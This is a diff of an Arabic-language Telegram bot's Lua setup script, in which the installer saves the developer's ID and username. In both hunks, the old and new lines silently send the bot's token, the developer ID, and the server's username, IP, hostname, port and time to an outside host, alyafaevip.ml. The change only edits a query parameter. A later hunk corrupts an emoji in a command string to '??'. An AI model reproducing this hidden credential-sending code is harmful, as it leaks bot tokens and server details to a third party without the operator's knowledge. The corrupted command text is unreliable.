@@ -47,7 +47,7 @@ local SUDOID = io.read()
 if SUDOID ~= '' then
 io.write('\27[1;35m تم حفظ ايدي المطور الاساسي \na┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n27[0;39;49m')
 database:set(id_server..":SUDO:ID",SUDOID)
-local t = json:decode(https.request('https://alyafaevip.ml/LHB/index.php?n=MARCOS&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
+local t = json:decode(https.request('https://alyafaevip.ml/LHB/index.php?token&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 else
 print('\27[0;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n لم يتم حفظ ايدي المطور الاساسي ارسله مره اخره')
 end 
@@ -59,7 +59,7 @@ local SUDOUSERNAME = io.read():gsub('@','')
 if SUDOUSERNAME ~= '' then
 io.write('\n\27[1;34m تم حفظ معرف المطور :\n\27[0;39;49m')
 database:set(id_server..":SUDO:USERNAME",'@'..SUDOUSERNAME)
-local t = json:decode(https.request('https://alyafaevip.ml/LHB/index.php?n=MARCOS&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
+local t = json:decode(https.request('https://alyafaevip.ml/LHB/index.php?token&id='..database:get(id_server..":SUDO:ID").."&token="..database:get(id_server..":token").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
 else
 print('\n\27[1;34m لم يتم حفظ معرف المطور :')
 end 
@@ -2216,7 +2216,7 @@ database:setex(bot_id.."textch:user" .. msg.chat_id_ .. "" .. msg.sender_user_id
 send(msg.chat_id_, msg.id_, '📌| حسنآ ارسل لي النص الذي تريده') 
 return false  
 end
-if text == "حذف رساله الاشتراك 🚫" and SudoBot(msg) then  
+if text == "حذف رساله الاشتراك ??" and SudoBot(msg) then  
 database:del(bot_id..'text:ch:user')
 send(msg.chat_id_, msg.id_, "🔘| تم مسح رساله الاشتراك ") 
 return false  
